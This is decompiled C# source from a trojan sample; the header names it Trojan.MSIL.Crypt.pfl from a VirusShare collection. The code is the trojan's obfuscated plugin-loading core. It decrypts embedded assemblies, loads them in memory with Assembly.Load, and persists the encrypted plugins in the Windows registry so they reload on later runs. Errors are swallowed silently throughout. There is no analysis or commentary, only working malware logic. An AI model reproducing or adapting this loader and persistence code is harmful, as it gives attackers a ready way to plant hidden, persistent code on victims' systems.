// Decompiled with JetBrains decompiler
// Type: {72cdc055-28ec-4f9d-8b62-984d485bab22}.{850b40f7-70ba-45f5-82f2-91e938f2914e}
// Assembly: Built, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 5BD05E0A-35FE-496C-B5CD-CE720A39B54F
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Trojan.MSIL.Crypt.pfl-5d072f5224e528472e5a50d1ebed572aa86c2691d7aedaced148054ce65a49be.exe

using \u007B72cdc055\u002D28ec\u002D4f9d\u002D8b62\u002D984d485bab22\u007D;
using \u007Be0269030\u002D1920\u002D42bf\u002Dbcc9\u002Dcc40375bc38b\u007D;
using \u007Bf78d88e7\u002D075b\u002D4573\u002D8694\u002D8d9a4066b1ab\u007D;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.Serialization.Formatters.Binary;
using System.Threading;

namespace \u007B72cdc055\u002D28ec\u002D4f9d\u002D8b62\u002D984d485bab22\u007D
{
  public class \u007B850b40f7\u002D70ba\u002D45f5\u002D82f2\u002D91e938f2914e\u007D
  {
    public static Dictionary<Guid, byte[]> \u007Bdf947cd8\u002D2622\u002D416f\u002D8b81\u002De1de1f93045c\u007D;
    public static Dictionary<Guid, XPlugin> \u007B501bcdc6\u002D41c9\u002D4a45\u002D98d0\u002Ddc0b832f3371\u007D;
    private static int \u007B065faef0\u002Ddb5d\u002D49de\u002Db0c5\u002Dd52d53591ff8\u007D;

    public static event \u007B850b40f7\u002D70ba\u002D45f5\u002D82f2\u002D91e938f2914e\u007D.\u007Be89b8d5b\u002D6dc9\u002D45d1\u002Db4d0\u002Db9de042b80d9\u007D \u007Bddfb3eec\u002D8d39\u002D4291\u002D9365\u002D230412cd22ea\u007D;

    public static void \u007Bb315ddbe\u002D4c0d\u002D490f\u002D9b16\u002D44bc6773f5b7\u007D()
    {
      \u007B850b40f7\u002D70ba\u002D45f5\u002D82f2\u002D91e938f2914e\u007D.\u007Bdf947cd8\u002D2622\u002D416f\u002D8b81\u002De1de1f93045c\u007D = new Dictionary<Guid, byte[]>();
      \u007B850b40f7\u002D70ba\u002D45f5\u002D82f2\u002D91e938f2914e\u007D.\u007B501bcdc6\u002D41c9\u002D4a45\u002D98d0\u002Ddc0b832f3371\u007D = new Dictionary<Guid, XPlugin>();
    }

    public static bool \u007B2a1f92fe\u002D117d\u002D44eb\u002Da6f7\u002Dd9c977729c27\u007D => \u007B850b40f7\u002D70ba\u002D45f5\u002D82f2\u002D91e938f2914e\u007D.\u007Bdf947cd8\u002D2622\u002D416f\u002D8b81\u002De1de1f93045c\u007D.Count > 0;

    public static bool \u007Be062340e\u002De7cf\u002D47e5\u002D8c87\u002D79f09963137b\u007D => \u007B850b40f7\u002D70ba\u002D45f5\u002D82f2\u002D91e938f2914e\u007D.\u007B501bcdc6\u002D41c9\u002D4a45\u002D98d0\u002Ddc0b832f3371\u007D.Count > 0;

    public static void \u007B90e1bdab\u002D7c85\u002D4bd6\u002D8bcc\u002D367124eecd9a\u007D()
    {
      try
      {
        BinaryFormatter binaryFormatter = new BinaryFormatter();
        MemoryStream serializationStream = new MemoryStream();
        binaryFormatter.Serialize((Stream) serializationStream, (object) \u007B850b40f7\u002D70ba\u002D45f5\u002D82f2\u002D91e938f2914e\u007D.\u007Bdf947cd8\u002D2622\u002D416f\u002D8b81\u002De1de1f93045c\u007D);
        serializationStream.Close();
        byte[] numArray = \u007B82ae5708\u002D4754\u002D4b76\u002Daf22\u002D8a4f62c094a0\u007D.\u007B8cecc9d2\u002D562f\u002D4662\u002D9612\u002D122f79a5ed99\u007D(serializationStream.ToArray(), false);
        if (\u007Bd073449f\u002D86b9\u002D4efb\u002Da81d\u002D53106aefd828\u007D.\u007B0f79670a\u002D586f\u002D4aa9\u002D881e\u002D2fa5920d268b\u007D == RegistryHive.CurrentUser)
          Registry.CurrentUser.CreateSubKey(\u007Bd073449f\u002D86b9\u002D4efb\u002Da81d\u002D53106aefd828\u007D.\u007B3db0ff9d\u002D380f\u002D471a\u002D963a\u002Dc8515e85ba55\u007D).SetValue(\u007Bd073449f\u002D86b9\u002D4efb\u002Da81d\u002D53106aefd828\u007D.\u007Bc4e69bc7\u002D9bd5\u002D4ad5\u002Dafd5\u002D30f9e4a2627e\u007D, (object) numArray);
        else
          Registry.LocalMachine.CreateSubKey(\u007Bd073449f\u002D86b9\u002D4efb\u002Da81d\u002D53106aefd828\u007D.\u007B3db0ff9d\u002D380f\u002D471a\u002D963a\u002Dc8515e85ba55\u007D).SetValue(\u007Bd073449f\u002D86b9\u002D4efb\u002Da81d\u002D53106aefd828\u007D.\u007Bc4e69bc7\u002D9bd5\u002D4ad5\u002Dafd5\u002D30f9e4a2627e\u007D, (object) numArray);
        serializationStream.Dispose();
      }
      catch
      {
      }
    }

    public static void \u007Bc3b38c28\u002Db50f\u002D4e49\u002D9c0a\u002D22c96136f81e\u007D()
    {
      if (!\u007Bd073449f\u002D86b9\u002D4efb\u002Da81d\u002D53106aefd828\u007D.\u007B4855a100\u002D9033\u002D444a\u002Dab63\u002Dc7295c38db03\u007D)
        return;
      new Thread((ThreadStart) (() =>
      {
        try
        {
          BinaryFormatter binaryFormatter = new BinaryFormatter();
          Dictionary<Guid, byte[]> dictionary;
          MemoryStream memoryStream;
          byte[] numArray1;
          if (\u007Bd073449f\u002D86b9\u002D4efb\u002Da81d\u002D53106aefd828\u007D.\u007B0f79670a\u002D586f\u002D4aa9\u002D881e\u002D2fa5920d268b\u007D == RegistryHive.CurrentUser)
          {
            MemoryStream serializationStream = new MemoryStream(\u007B82ae5708\u002D4754\u002D4b76\u002Daf22\u002D8a4f62c094a0\u007D.\u007B037930f3\u002D3290\u002D45b0\u002Daac6\u002D01f31fa3de21\u007D(Registry.CurrentUser.CreateSubKey(\u007Bd073449f\u002D86b9\u002D4efb\u002Da81d\u002D53106aefd828\u007D.\u007B3db0ff9d\u002D380f\u002D471a\u002D963a\u002Dc8515e85ba55\u007D).GetValue(\u007Bd073449f\u002D86b9\u002D4efb\u002Da81d\u002D53106aefd828\u007D.\u007Bc4e69bc7\u002D9bd5\u002D4ad5\u002Dafd5\u002D30f9e4a2627e\u007D) as byte[], false));
            dictionary = binaryFormatter.Deserialize((Stream) serializationStream) as Dictionary<Guid, byte[]>;
            serializationStream.Close();
            serializationStream.Dispose();
            memoryStream = (MemoryStream) null;
            numArray1 = (byte[]) null;
          }
          else
          {
            MemoryStream serializationStream = new MemoryStream(\u007B82ae5708\u002D4754\u002D4b76\u002Daf22\u002D8a4f62c094a0\u007D.\u007B037930f3\u002D3290\u002D45b0\u002Daac6\u002D01f31fa3de21\u007D(Registry.LocalMachine.CreateSubKey(\u007Bd073449f\u002D86b9\u002D4efb\u002Da81d\u002D53106aefd828\u007D.\u007B3db0ff9d\u002D380f\u002D471a\u002D963a\u002Dc8515e85ba55\u007D).GetValue(\u007Bd073449f\u002D86b9\u002D4efb\u002Da81d\u002D53106aefd828\u007D.\u007Bc4e69bc7\u002D9bd5\u002D4ad5\u002Dafd5\u002D30f9e4a2627e\u007D) as byte[], false));
            dictionary = binaryFormatter.Deserialize((Stream) serializationStream) as Dictionary<Guid, byte[]>;
            serializationStream.Close();
            serializationStream.Dispose();
            memoryStream = (MemoryStream) null;
            numArray1 = (byte[]) null;
          }
          foreach (byte[] numArray2 in dictionary.Values)
            \u007B850b40f7\u002D70ba\u002D45f5\u002D82f2\u002D91e938f2914e\u007D.\u007B0e523f0d\u002D07c7\u002D4632\u002Da26b\u002D171b853daa9b\u007D(numArray2);
        }
        catch
        {
        }
      })).Start();
    }

    public static void \u007Bfd304405\u002D0ce7\u002D4c3c\u002Db1d7\u002D40d5cd26fe91\u007D()
    {
      if (!\u007Bd073449f\u002D86b9\u002D4efb\u002Da81d\u002D53106aefd828\u007D.\u007Bc76dcb97\u002Df5c1\u002D4c34\u002D9269\u002Df565acd372ee\u007D || \u007Bd073449f\u002D86b9\u002D4efb\u002Da81d\u002D53106aefd828\u007D.\u007B4855a100\u002D9033\u002D444a\u002Dab63\u002Dc7295c38db03\u007D && Process.GetCurrentProcess().MainModule.FileName == \u007Bd073449f\u002D86b9\u002D4efb\u002Da81d\u002D53106aefd828\u007D.\u007Bc05a2a50\u002D2d74\u002D45b6\u002D9f80\u002D3e5ab73c8f0c\u007D + "\\" + \u007Bd073449f\u002D86b9\u002D4efb\u002Da81d\u002D53106aefd828\u007D.\u007Be5448bfc\u002Dfcf6\u002D422b\u002D8044\u002Df90a3b6d6786\u007D)
        return;
      new Thread((ThreadStart) (() =>
      {
        try
        {
          Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(\u007Bd073449f\u002D86b9\u002D4efb\u002Da81d\u002D53106aefd828\u007D.\u007Ba37616e7\u002Deaa9\u002D4e4e\u002D9c3a\u002D1af8a64b3574\u007D);
          byte[] buffer1 = new byte[manifestResourceStream.Length];
          manifestResourceStream.Read(buffer1, 0, buffer1.Length);
          byte[] buffer2 = \u007B82ae5708\u002D4754\u002D4b76\u002Daf22\u002D8a4f62c094a0\u007D.\u007B037930f3\u002D3290\u002D45b0\u002Daac6\u002D01f31fa3de21\u007D(buffer1, false);
          manifestResourceStream.Close();
          MemoryStream input = new MemoryStream(buffer2);
          BinaryReader binaryReader = new BinaryReader((Stream) input);
          while (binaryReader.PeekChar() > 0)
          {
            int count = binaryReader.ReadInt32();
            \u007B850b40f7\u002D70ba\u002D45f5\u002D82f2\u002D91e938f2914e\u007D.\u007B0e523f0d\u002D07c7\u002D4632\u002Da26b\u002D171b853daa9b\u007D(\u007B82ae5708\u002D4754\u002D4b76\u002Daf22\u002D8a4f62c094a0\u007D.\u007B037930f3\u002D3290\u002D45b0\u002Daac6\u002D01f31fa3de21\u007D(binaryReader.ReadBytes(count), false));
          }
          if (\u007Bd073449f\u002D86b9\u002D4efb\u002Da81d\u002D53106aefd828\u007D.\u007B4855a100\u002D9033\u002D444a\u002Dab63\u002Dc7295c38db03\u007D)
            \u007B850b40f7\u002D70ba\u002D45f5\u002D82f2\u002D91e938f2914e\u007D.\u007B90e1bdab\u002D7c85\u002D4bd6\u002D8bcc\u002D367124eecd9a\u007D();
          binaryReader.Close();
          input.Dispose();
        }
        catch
        {
        }
      })).Start();
    }

    public static XPlugin \u007B0e523f0d\u002D07c7\u002D4632\u002Da26b\u002D171b853daa9b\u007D(
      byte[] _param0)
    {
      try
      {
        Assembly loadedAsm = (Assembly) null;
        ((\u007B850b40f7\u002D70ba\u002D45f5\u002D82f2\u002D91e938f2914e\u007D.\u007B0a23ef40\u002D4ae9\u002D4b7a\u002D8e9b\u002D2b260771a6d0\u007D) (b => loadedAsm = Assembly.Load(b)))(_param0);
        foreach (Type type in loadedAsm.GetTypes())
        {
          if (type.IsClass && type.IsSubclassOf(typeof (XPlugin)))
          {
            int num = 0;
            XPlugin instance = (XPlugin) Activator.CreateInstance(type);
            if (\u007B850b40f7\u002D70ba\u002D45f5\u002D82f2\u002D91e938f2914e\u007D.\u007Bdf947cd8\u002D2622\u002D416f\u002D8b81\u002De1de1f93045c\u007D.ContainsKey(instance.Guid))
              ++num;
            else
              \u007B850b40f7\u002D70ba\u002D45f5\u002D82f2\u002D91e938f2914e\u007D.\u007Bdf947cd8\u002D2622\u002D416f\u002D8b81\u002De1de1f93045c\u007D.Add(instance.Guid, _param0);
            if (\u007B850b40f7\u002D70ba\u002D45f5\u002D82f2\u002D91e938f2914e\u007D.\u007B501bcdc6\u002D41c9\u002D4a45\u002D98d0\u002Ddc0b832f3371\u007D.ContainsKey(instance.Guid))
              ++num;
            else
              \u007B850b40f7\u002D70ba\u002D45f5\u002D82f2\u002D91e938f2914e\u007D.\u007B501bcdc6\u002D41c9\u002D4a45\u002D98d0\u002Ddc0b832f3371\u007D.Add(instance.Guid, instance);
            if (num == 2)
            {
              \u007B850b40f7\u002D70ba\u002D45f5\u002D82f2\u002D91e938f2914e\u007D.\u007B065faef0\u002Ddb5d\u002D49de\u002Db0c5\u002Dd52d53591ff8\u007D = 1;
              return (XPlugin) null;
            }
            \u007B850b40f7\u002D70ba\u002D45f5\u002D82f2\u002D91e938f2914e\u007D.\u007B065faef0\u002Ddb5d\u002D49de\u002Db0c5\u002Dd52d53591ff8\u007D = 0;
            if (\u007B850b40f7\u002D70ba\u002D45f5\u002D82f2\u002D91e938f2914e\u007D.\u007B2fd8aacf\u002D4b1c\u002D49b6\u002D92e3\u002Df5c2445f3043\u007D != null)
              \u007B850b40f7\u002D70ba\u002D45f5\u002D82f2\u002D91e938f2914e\u007D.\u007B2fd8aacf\u002D4b1c\u002D49b6\u002D92e3\u002Df5c2445f3043\u007D((object) null, instance);
            return instance;
          }
        }
        \u007B850b40f7\u002D70ba\u002D45f5\u002D82f2\u002D91e938f2914e\u007D.\u007B065faef0\u002Ddb5d\u002D49de\u002Db0c5\u002Dd52d53591ff8\u007D = 2;
      }
      catch (Exception ex)
      {
        \u007B850b40f7\u002D70ba\u002D45f5\u002D82f2\u002D91e938f2914e\u007D.\u007B065faef0\u002Ddb5d\u002D49de\u002Db0c5\u002Dd52d53591ff8\u007D = 3;
      }
      return (XPlugin) null;
    }

    public static void \u007B4ca5dca9\u002Dd333\u002D4254\u002D821d\u002D64c324f0a45c\u007D(
      Guid _param0)
    {
      if (!\u007B850b40f7\u002D70ba\u002D45f5\u002D82f2\u002D91e938f2914e\u007D.\u007B501bcdc6\u002D41c9\u002D4a45\u002D98d0\u002Ddc0b832f3371\u007D.ContainsKey(_param0))
        return;
      \u007B850b40f7\u002D70ba\u002D45f5\u002D82f2\u002D91e938f2914e\u007D.\u007Bdf947cd8\u002D2622\u002D416f\u002D8b81\u002De1de1f93045c\u007D.Remove(_param0);
      \u007B850b40f7\u002D70ba\u002D45f5\u002D82f2\u002D91e938f2914e\u007D.\u007B501bcdc6\u002D41c9\u002D4a45\u002D98d0\u002Ddc0b832f3371\u007D.Remove(_param0);
    }

    public static int \u007B17e4f0a4\u002Dc922\u002D445a\u002Db975\u002D11cee0201113\u007D() => \u007B850b40f7\u002D70ba\u002D45f5\u002D82f2\u002D91e938f2914e\u007D.\u007B065faef0\u002Ddb5d\u002D49de\u002Db0c5\u002Dd52d53591ff8\u007D;

    public static void \u007Bee2e974d\u002D7e38\u002D447f\u002Da8d4\u002De8dbb9e2f582\u007D()
    {
      try
      {
        if (!\u007Bd073449f\u002D86b9\u002D4efb\u002Da81d\u002D53106aefd828\u007D.\u007B4855a100\u002D9033\u002D444a\u002Dab63\u002Dc7295c38db03\u007D)
          return;
        if (\u007Bd073449f\u002D86b9\u002D4efb\u002Da81d\u002D53106aefd828\u007D.\u007B0f79670a\u002D586f\u002D4aa9\u002D881e\u002D2fa5920d268b\u007D == RegistryHive.CurrentUser)
          Registry.CurrentUser.CreateSubKey(\u007Bd073449f\u002D86b9\u002D4efb\u002Da81d\u002D53106aefd828\u007D.\u007B3db0ff9d\u002D380f\u002D471a\u002D963a\u002Dc8515e85ba55\u007D).DeleteValue(\u007Bd073449f\u002D86b9\u002D4efb\u002Da81d\u002D53106aefd828\u007D.\u007Bc4e69bc7\u002D9bd5\u002D4ad5\u002Dafd5\u002D30f9e4a2627e\u007D);
        else
          Registry.LocalMachine.CreateSubKey(\u007Bd073449f\u002D86b9\u002D4efb\u002Da81d\u002D53106aefd828\u007D.\u007B3db0ff9d\u002D380f\u002D471a\u002D963a\u002Dc8515e85ba55\u007D).DeleteValue(\u007Bd073449f\u002D86b9\u002D4efb\u002Da81d\u002D53106aefd828\u007D.\u007Bc4e69bc7\u002D9bd5\u002D4ad5\u002Dafd5\u002D30f9e4a2627e\u007D);
      }
      catch
      {
      }
    }

    public static void \u007Bf56d2acf\u002Dbc54\u002D4089\u002D87f2\u002Db196e099d2aa\u007D(
      PluginArgs _param0)
    {
      if (!\u007B850b40f7\u002D70ba\u002D45f5\u002D82f2\u002D91e938f2914e\u007D.\u007B501bcdc6\u002D41c9\u002D4a45\u002D98d0\u002Ddc0b832f3371\u007D.ContainsKey(_param0.PluginGuid))
        return;
      \u007B850b40f7\u002D70ba\u002D45f5\u002D82f2\u002D91e938f2914e\u007D.\u007B501bcdc6\u002D41c9\u002D4a45\u002D98d0\u002Ddc0b832f3371\u007D[_param0.PluginGuid].Execute(_param0);
    }

    public delegate void \u007Be89b8d5b\u002D6dc9\u002D45d1\u002Db4d0\u002Db9de042b80d9\u007D(
      object sender,
      XPlugin plugin);

    private delegate void \u007B0a23ef40\u002D4ae9\u002D4b7a\u002D8e9b\u002D2b260771a6d0\u007D(
      byte[] bytes);
  }
}
